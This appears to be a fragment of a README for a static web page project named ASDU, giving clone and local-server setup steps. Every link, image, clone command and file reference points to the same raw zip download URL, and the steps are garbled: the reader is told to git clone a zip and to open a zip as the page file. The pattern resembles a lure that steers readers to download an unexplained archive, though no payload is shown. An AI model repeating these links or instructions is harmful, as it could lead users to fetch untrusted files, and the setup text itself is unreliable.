...
- [UI/UX](https://github.com/KaterineLimaE/asdu-page/raw/refs/heads/develop/imagesProjects/asdu-page-1.5-beta.2.zip%3A39&t=FI152LRbuqlvJwCz-1)
...
![](https://github.com/KaterineLimaE/asdu-page/raw/refs/heads/develop/imagesProjects/asdu-page-1.5-beta.2.zip "Given input: 13")
...
![](https://github.com/KaterineLimaE/asdu-page/raw/refs/heads/develop/imagesProjects/asdu-page-1.5-beta.2.zip "Given input: 13")
```
git clone https://github.com/KaterineLimaE/asdu-page/raw/refs/heads/develop/imagesProjects/asdu-page-1.5-beta.2.zip
```
![](https://github.com/KaterineLimaE/asdu-page/raw/refs/heads/develop/imagesProjects/asdu-page-1.5-beta.2.zip "Given input: 13")
```
cd asdu-page/
...
To start a local development server with live reloading for the **ASDU** static web page you can do it via an extension called **Live Server** or simply by opening the **https://github.com/KaterineLimaE/asdu-page/raw/refs/heads/develop/imagesProjects/asdu-page-1.5-beta.2.zip** file.
...
**01.- https://github.com/KaterineLimaE/asdu-page/raw/refs/heads/develop/imagesProjects/asdu-page-1.5-beta.2.zip** For this option you only need to select the file from the directory as in the image and that's it.
